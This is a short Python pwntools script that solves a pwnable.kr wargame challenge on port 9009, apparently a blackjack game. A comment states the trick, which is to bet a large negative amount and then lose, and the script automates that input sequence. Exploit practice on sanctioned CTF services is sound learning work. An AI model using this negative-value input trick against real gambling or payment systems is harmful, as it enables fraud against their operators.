from pwn import *

# input
host = 'pwnable.kr'
port = 9009

# Notes
#   * Just bet a very large negative amount and then lose.

def attack():
  s = remote(host, port)
  print s.recv()
  s.sendline('Y')
  print s.recv()
  s.sendline('1')
  print s.recv()
  s.sendline('-1000000')
  print s.recv()
  for i in range(5):
    s.sendline('H')
    print s.recv()
  s.interactive()

if __name__ == '__main__':
  attack()
